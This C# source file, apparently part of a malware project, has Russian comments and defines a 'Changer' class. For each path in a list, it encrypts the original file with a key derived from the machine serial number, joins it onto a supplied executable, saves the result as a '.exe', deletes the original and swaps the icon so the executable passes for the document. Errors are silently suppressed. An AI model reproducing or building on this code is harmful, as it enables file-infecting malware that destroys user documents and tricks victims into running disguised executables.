using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Instruments
{
    public class Changer
    {
        /// <summary>
        /// Заменяет файл на ехе файл, с дозаписью зашифрованных данных исходного файла в конец ехе файла.\n
        /// А также замена иконки получившегося файла.
        /// </summary>
        /// <param name="path">Путь исходного файла, который будет заменяться</param>
        /// <param name="exeData">ехе - файл, который будет заменять исходный файл</param>
        public static void ChangeSingle(string path, byte[] exeData)
        {

            try
            {
                byte[] docData = FileOperations.ReadData(path);
                docData = Encryptor.Encrypt(docData, WebOperations.MD5(WebOperations.GetSerialNumber()));
                
                byte[] resultData = exeData.Concat(docData).ToArray();
                resultData = resultData.Concat(BitConverter.GetBytes(exeData.Length)).ToArray();
                
                FileOperations.AppendAllBytes(path + ".exe", resultData);
                File.Delete(path);
                IconChanger.ChangeIcon(path + ".exe");
            }
            catch { }
        }
        /// <summary>
        /// Замена всех файлов из списка, на заданный ехе файл.
        /// </summary>
        /// <param name="paths">Список заменяемых файлов</param>
        /// <param name="exeData">ехе - файл, который заменяет исходные файлы</param>
        public static void Change(List<String> paths, byte[] exeData)
        {
            DllExtracter.ExtractDll("IconChanger");
            foreach (var path in paths)
            {
                ChangeSingle(path, exeData);
            }
        }

    }
}
